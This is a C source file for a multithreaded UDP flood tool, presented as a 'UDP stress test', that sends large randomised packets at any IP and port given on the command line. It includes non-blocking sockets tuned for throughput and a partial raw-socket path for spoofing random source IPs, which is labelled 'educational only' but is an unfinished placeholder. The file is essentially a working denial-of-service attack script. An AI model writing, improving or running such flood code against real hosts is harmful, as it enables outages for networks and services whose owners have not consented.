#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/time.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <fcntl.h>
#ifdef __linux__
#include <sys/ioctl.h>
#include <net/if.h>
#endif

#define MAX_PACKET_SIZE 65507
#define DEFAULT_PACKET_SIZE 1024
#define SPOOFED_IP_COUNT 1000

volatile sig_atomic_t stop = 0;
pthread_mutex_t lock;

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
    unsigned long packets_sent;
    unsigned long bytes_sent;
    unsigned long errors;
} thread_data;

// Random IP generator for spoofing (educational only)
void generate_random_ip(char *buffer) {
    snprintf(buffer, 16, "%d.%d.%d.%d", 
        rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

// Create raw socket for advanced packet crafting
int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == -1) {
        perror("Raw socket creation failed");
        return -1;
    }
    
    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
        perror("setsockopt(IP_HDRINCL) failed");
        close(sock);
        return -1;
    }
    
    return sock;
}

// Create optimized UDP socket
int create_udp_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == -1) {
        perror("UDP socket creation failed");
        return -1;
    }
    
    // Enable socket reuse and other optimizations
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        perror("setsockopt(SO_REUSEADDR) failed");
    }
    
    // Set non-blocking for higher throughput
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Increase socket buffer sizes
    int buf_size = 1024 * 1024; // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
    
    return sock;
}

// Generate random payload with patterns for analysis
void generate_payload(char *payload, int size) {
    // Start with a pattern for identification
    memcpy(payload, "UDPSTRESS", 9);
    
    // Add random data
    for (int i = 9; i < size; i++) {
        payload[i] = (char)(rand() % 256);
    }
    
    // Add some identifiable patterns at fixed intervals
    for (int i = 0; i < size; i += 64) {
        if (i + 4 < size) {
            payload[i] = 'P';
            payload[i+1] = 'T';
            payload[i+2] = 'R';
            payload[i+3] = 'N';
        }
    }
}

void *udp_flood(void *arg) {
    thread_data *data = (thread_data *)arg;
    struct sockaddr_in dest_addr;
    char payload[MAX_PACKET_SIZE];
    struct timeval start_time, current_time;
    int sock = -1;
    int use_raw = 0; // Change to 1 to test raw sockets (needs root)
    
    // Initialize destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    dest_addr.sin_addr.s_addr = inet_addr(data->target_ip);
    
    // Create socket based on mode
    if (use_raw) {
        sock = create_raw_socket();
    } else {
        sock = create_udp_socket();
    }
    
    if (sock < 0) {
        pthread_mutex_lock(&lock);
        fprintf(stderr, "Thread %d: Socket creation failed\n", data->thread_id);
        pthread_mutex_unlock(&lock);
        return NULL;
    }
    
    gettimeofday(&start_time, NULL);
    
    // Pre-generate spoofed IPs (educational only)
    char spoofed_ips[SPOOFED_IP_COUNT][16];
    if (use_raw) {
        for (int i = 0; i < SPOOFED_IP_COUNT; i++) {
            generate_random_ip(spoofed_ips[i]);
        }
    }
    
    while (!stop) {
        gettimeofday(&current_time, NULL);
        if ((current_time.tv_sec - start_time.tv_sec) >= data->duration) {
            break;
        }
        
        // Generate random payload
        int pkt_size = DEFAULT_PACKET_SIZE + (rand() % (MAX_PACKET_SIZE - DEFAULT_PACKET_SIZE));
        generate_payload(payload, pkt_size);
        
        // Randomize source port for each packet
        if (!use_raw) {
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_addr.s_addr = INADDR_ANY;
            src_addr.sin_port = htons(1024 + (rand() % 64512));
            
            if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
                data->errors++;
                continue;
            }
        }
        
        // Send packet
        int bytes_sent;
        if (use_raw) {
            // Advanced: Craft full IP/UDP packet with spoofed source (needs root)
            // This is just a placeholder - actual implementation would need full packet crafting
            bytes_sent = sendto(sock, payload, pkt_size, 0, 
                              (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        } else {
            bytes_sent = sendto(sock, payload, pkt_size, 0, 
                              (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
        
        if (bytes_sent > 0) {
            data->packets_sent++;
            data->bytes_sent += bytes_sent;
        } else {
            data->errors++;
        }
        
        // Micro-optimization: Small delay to prevent complete socket buffer saturation
        usleep(10); // 10 microseconds
    }
    
    close(sock);
    return NULL;
}

void print_stats(thread_data *threads, int thread_count) {
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;
    unsigned long total_errors = 0;
    
    printf("\nThread Stats:\n");
    printf("ID\tPackets\t\tBytes\t\tErrors\n");
    printf("--------------------------------------------\n");
    
    for (int i = 0; i < thread_count; i++) {
        printf("%d\t%lu\t\t%.2f MB\t\t%lu\n", 
               threads[i].thread_id,
               threads[i].packets_sent,
               (float)threads[i].bytes_sent / (1024 * 1024),
               threads[i].errors);
               
        total_packets += threads[i].packets_sent;
        total_bytes += threads[i].bytes_sent;
        total_errors += threads[i].errors;
    }
    
    printf("\nTotal:\t%lu packets\t%.2f MB\t\t%lu errors\n", 
           total_packets, (float)total_bytes / (1024 * 1024), total_errors);
    printf("Average: %.2f packets/sec\n", (float)total_packets / threads[0].duration);
    printf("Bandwidth: %.2f Mbps\n", 
           ((float)total_bytes * 8) / (threads[0].duration * 1024 * 1024));
}

void handle_signal(int sig) {
    stop = 1;
    printf("\nStopping all threads...\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 4\n");
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    
    if (thread_count <= 0 || duration <= 0) {
        printf("Invalid thread count or duration\n");
        return 1;
    }
    
    // Verify target IP
    struct sockaddr_in sa;
    if (inet_pton(AF_INET, target_ip, &(sa.sin_addr)) != 1) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    // Initialize random seed
    srand(time(NULL) ^ getpid());
    
    // Set up signal handler
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    // Initialize mutex
    if (pthread_mutex_init(&lock, NULL) != 0) {
        printf("Mutex init failed\n");
        return 1;
    }
    
    // Create threads
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    thread_data *thread_data_arr = malloc(thread_count * sizeof(thread_data));
    
    if (!threads || !thread_data_arr) {
        printf("Memory allocation failed\n");
        return 1;
    }
    
    printf("Starting UDP stress test with %d threads for %d seconds...\n", thread_count, duration);
    printf("Target: %s:%d\n", target_ip, target_port);
    
    for (int i = 0; i < thread_count; i++) {
        thread_data_arr[i].target_ip = target_ip;
        thread_data_arr[i].target_port = target_port;
        thread_data_arr[i].duration = duration;
        thread_data_arr[i].thread_id = i + 1;
        thread_data_arr[i].packets_sent = 0;
        thread_data_arr[i].bytes_sent = 0;
        thread_data_arr[i].errors = 0;
        
        if (pthread_create(&threads[i], NULL, udp_flood, &thread_data_arr[i])) {
            printf("Failed to create thread %d\n", i);
            continue;
        }
    }
    
    // Monitor progress
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    
    while (!stop) {
        gettimeofday(&current_time, NULL);
        int elapsed = current_time.tv_sec - start_time.tv_sec;
        
        if (elapsed >= duration) {
            break;
        }
        
        // Print progress every second
        if (elapsed > 0 && (current_time.tv_sec % 1 == 0)) {
            unsigned long total_packets = 0;
            for (int i = 0; i < thread_count; i++) {
                total_packets += thread_data_arr[i].packets_sent;
            }
            
            printf("\rElapsed: %ds | Packets: %lu | Rate: %.2f pkt/sec", 
                   elapsed, total_packets, (float)total_packets / elapsed);
            fflush(stdout);
        }
        
        usleep(100000); // 100ms
    }
    
    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Print final statistics
    print_stats(thread_data_arr, thread_count);
    
    // Cleanup
    pthread_mutex_destroy(&lock);
    free(threads);
    free(thread_data_arr);
    
    return 0;
}
